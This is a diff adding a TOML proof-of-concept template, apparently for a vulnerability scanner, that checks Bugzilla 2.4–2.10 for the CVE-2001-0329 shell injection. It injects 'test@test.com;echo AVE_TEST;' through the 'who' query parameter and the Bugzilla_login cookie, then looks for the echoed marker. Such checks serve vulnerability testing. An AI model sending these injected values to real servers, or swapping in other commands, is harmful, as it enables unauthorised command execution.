@@ -1,0 +1,61 @@
+[info]
+author = "AVE"
+description = "验证 Bugzilla 2.4-2.10 版本中 process_bug.cgi 的 who 参数是否存在 shell 元字符注入漏洞。通过发送包含 echo AVE_TEST 的恶意 who 参数，若响应中包含 AVE_TEST 则证明命令执行成功。"
+id = "POC-AVE-2001-0145"
+name = "Mozilla Bugzilla 任意命令执行漏洞 PoC"
+severity = "high"
+tags = [
+    "cve-2001-0329",
+    "bugzilla",
+    "rce",
+    "shell-injection",
+]
+vuln_id = [
+    "CVE-2001-0329",
+    "AVE-2001-0145",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/process_bug.cgi"
+protocol = "http"
+
+[poc.requests.attack]
+name = "who"
+type = "query"
+value = "test@test.com;echo AVE_TEST;"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["AVE_TEST"]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/post_bug.cgi"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+Cookie = "Bugzilla_login=test@test.com;echo AVE_TEST;"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["AVE_TEST"]
